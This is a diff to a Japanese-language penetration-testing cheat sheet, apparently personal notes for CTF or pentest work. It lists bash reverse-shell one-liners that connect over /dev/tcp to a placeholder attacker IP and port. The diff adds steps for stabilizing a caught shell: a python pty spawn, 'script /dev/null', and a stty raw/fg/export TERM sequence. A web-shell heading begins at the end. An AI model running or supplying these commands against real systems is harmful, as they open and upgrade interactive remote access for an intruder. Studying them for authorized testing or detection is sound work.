@@ -10,11 +10,12 @@
     1. `bash -i >& /dev/tcp/[IPアドレス/[ポート番号] 0>&1`
     2. `bash -c 'bash -i >& /dev/tcp/[IPアドレス/[ポート番号] 0>&1'`
 4. シェルの安定化
+    * python
     1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
-    2. `Ctrl-z`
-    3. `stty raw -echo; fg`
-    4. `export SHELL=[your shell]`
-    5. `export TERM=[your terminal]`
+    2. `CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;`
+    * shell
+    1. `script /dev/null -qc /bin/bash` #/dev/null is to not store anything(inside the nc session)
+    2. `CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;`
 
 * Webシェル
 
